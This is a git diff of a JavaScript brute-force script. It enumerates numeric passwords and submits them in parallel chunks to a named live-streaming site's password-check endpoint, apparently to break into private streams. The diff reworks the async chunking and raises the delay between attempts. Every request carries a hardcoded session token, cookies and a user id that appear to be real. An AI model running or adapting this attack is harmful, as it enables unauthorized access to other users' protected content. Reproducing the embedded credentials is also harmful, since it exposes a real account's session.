@@ -21,22 +21,24 @@ const tryPwd = async (pwd, { id = '5df9b47181171731bc5a51e5' }) => {
   fData.append('live_view_pwd', pwd);
   fData.append('live_obj_id', id);
 
-  const res = await fetch('http://www.lespark.cn/secret_live_pwd/judge', {
-    method: 'POST',
-    // body: fData,
-    body: `live_view_pwd=${pwd}&live_obj_id=${id}&`,
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      token: '39fe1d0deeb89662f82545d47b97c145',
-      Cookie: 'gr_user_id=e4d8bf16-3286-48d8-a066-e5fa7e90709a; language=English; source=; grwng_uid=9b7dceb6-4a3c-4027-90ec-c12aa9494ad9; token=39fe1d0deeb89662f82545d47b97c145; user_id=5d94c8fdf7794d71bb2af74a; avatar=http%3A%2F%2Fimg2.lespark.cn%2Favatar%2Fali86MWYIfVDHcnlr_150x150; lgid=9132142; nickname=yyc; be366bc92047ce43_gr_session_id=d1e4d8e2-a7dc-4a47-be41-46fc39eb41d0; be366bc92047ce43_gr_session_id_d1e4d8e2-a7dc-4a47-be41-46fc39eb41d0=true; Hm_lvt_01e86260df9ef3ac945a13ba3c90ed64=1576036444,1576651990; Hm_lpvt_01e86260df9ef3ac945a13ba3c90ed64=1576652864',
-      'bundle-id': 'pc',
-      user_id: '5d94c8fdf7794d71bb2af74a'
-    },
-  });
-
   try {
+    const res = await fetch('http://www.lespark.cn/secret_live_pwd/judge', {
+      method: 'POST',
+      // body: fData,
+      body: `live_view_pwd=${pwd}&live_obj_id=${id}&`,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        token: '39fe1d0deeb89662f82545d47b97c145',
+        Cookie: 'gr_user_id=e4d8bf16-3286-48d8-a066-e5fa7e90709a; language=English; source=; grwng_uid=9b7dceb6-4a3c-4027-90ec-c12aa9494ad9; token=39fe1d0deeb89662f82545d47b97c145; user_id=5d94c8fdf7794d71bb2af74a; avatar=http%3A%2F%2Fimg2.lespark.cn%2Favatar%2Fali86MWYIfVDHcnlr_150x150; lgid=9132142; nickname=yyc; be366bc92047ce43_gr_session_id=d1e4d8e2-a7dc-4a47-be41-46fc39eb41d0; be366bc92047ce43_gr_session_id_d1e4d8e2-a7dc-4a47-be41-46fc39eb41d0=true; Hm_lvt_01e86260df9ef3ac945a13ba3c90ed64=1576036444,1576651990; Hm_lpvt_01e86260df9ef3ac945a13ba3c90ed64=1576652864',
+        'bundle-id': 'pc',
+        user_id: '5d94c8fdf7794d71bb2af74a'
+      },
+    });
+
     const response = await res.json();
+
     // console.log(`live_view_pwd=${pwd}&live_obj_id=${id}`);
+    // console.log(response.msg);
     if (response.msg === 'ok') {
       console.log(pwd);
       console.log(response);
@@ -45,26 +47,20 @@ const tryPwd = async (pwd, { id = '5df9b47181171731bc5a51e5' }) => {
   } catch (err) {
     console.log(err);
     console.log(pwd);
-    const response = await res.text();
-    console.log(response);
     return false;
   }
 };
 
-const tryAllPwdChunks = (pwdChunks, { id, waitfor }) => {
-  const failedChunks = [];
-
-  pwdChunks.forEach(async (pwdChunk) => {
+const tryAllPwdChunks = async (pwdChunks, { id, waitfor }) => {
+  await Promise.all(pwdChunks.map(async (pwdChunk) => {
     await wait(waitfor);
-
-    const isSuccess = await Promise.all(
+    await Promise.all(
       pwdChunk.map((pwd) => tryPwd(pwd, { id })),
     );
 
-    !isSuccess && failedChunks.push(pwdChunk);
-  });
-
-  return failedChunks;
+    console.log(`finish ${JSON.stringify(pwdChunk)}`);
+  }));
+  console.log('finish all')
 };
 
 /**
@@ -74,7 +70,6 @@ const tryAllPwdChunks = (pwdChunks, { id, waitfor }) => {
  * @param {number} fillWith
  */
 const fillDigits = (pwd = '', totalDigits = 6, fillWith = 0) => {
-  console.log(pwd);
   const digitsToFill = totalDigits - `${pwd}`.length;
   const placeholder = [ ...Array(digitsToFill) ].fill(fillWith).join('');
   return `${placeholder}${pwd}`;
@@ -110,7 +105,7 @@ const sortChunkPwds = (pwds = [], size) => {
  * @param {number} argv.to
  * @param {string} mode options ["all"]
  */
-const start = async ({ from = 0, to = 0, id, waitfor = 10, mode, chunksize = 10 }) => {
+const start = async ({ from = 0, to = 0, id, waitfor = 100, mode, chunksize = 10 }) => {
   const pwds = getAllPwds(from, to);
 
   const pwdsChunks = sortChunkPwds(pwds, chunksize);
@@ -119,16 +114,11 @@ const start = async ({ from = 0, to = 0, id, waitfor = 10, mode, chunksize = 10 
     chunksize,
   );
 
-  console.log('Start trying passwords with full digits');
-  const failedFullDigitChunks = tryAllPwdChunks(pwdsFullDigitChunks, { id, waitfor });
+  await tryAllPwdChunks(pwdsChunks, { id, waitfor });
 
-  let failedPartialDigitsChunks = [];
   if (mode === 'all') {
-    console.log('Start trying passwords with partial digits');
-    failedPartialDigitsChunks = tryAllPwdChunks(pwdsChunks, { id, waitfor });
+    await tryAllPwdChunks(pwdsFullDigitChunks, { id, waitfor });
   }
-
-  console.log(JSON.stringify([...failedFullDigitChunks, ...failedPartialDigitsChunks]));
 };
 
 module.exports = {
